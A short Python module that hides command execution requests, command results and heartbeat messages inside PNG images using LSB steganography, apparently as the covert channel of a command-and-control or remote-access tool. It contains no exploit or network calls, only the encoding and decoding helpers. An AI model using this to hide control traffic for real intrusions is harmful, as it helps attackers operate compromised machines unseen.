import io

import stegano

from common.dataclasses.commands import CommandExecutionRequest, CommandExecutionResult
from common.dataclasses.heartbeat import Heartbeat


def __hide_message_to_image(message: str, image: bytes) -> bytes:
    image_with_secret = stegano.lsb.hide(io.BytesIO(image), message)
    buffer = io.BytesIO()
    image_with_secret.save(buffer, format="PNG")
    return buffer.getbuffer().tobytes()


def __decode_message_from_image(image: bytes) -> str:
    return stegano.lsb.reveal(io.BytesIO(image))


def insert_command_request_into_image(image: bytes, command: CommandExecutionRequest) -> bytes:
    return __hide_message_to_image(command.model_dump_json(), image)


def read_command_request_from_image(image: bytes) -> CommandExecutionRequest:
    decoded_json = __decode_message_from_image(image)
    return CommandExecutionRequest.model_validate_json(decoded_json, strict=True)


def insert_command_result_into_image(image: bytes, result: CommandExecutionResult) -> bytes:
    return __hide_message_to_image(result.model_dump_json(), image)


def read_command_result_from_image(image: bytes) -> CommandExecutionResult:
    decoded_json = __decode_message_from_image(image)
    return CommandExecutionResult.model_validate_json(decoded_json)


def insert_heartbeat_into_image(image: bytes, heartbeat: Heartbeat) -> bytes:
    return __hide_message_to_image(heartbeat.model_dump_json(), image)


def read_heartbeat_from_image(image: bytes) -> Heartbeat:
    decoded_json = __decode_message_from_image(image)
    return Heartbeat.model_validate_json(decoded_json)
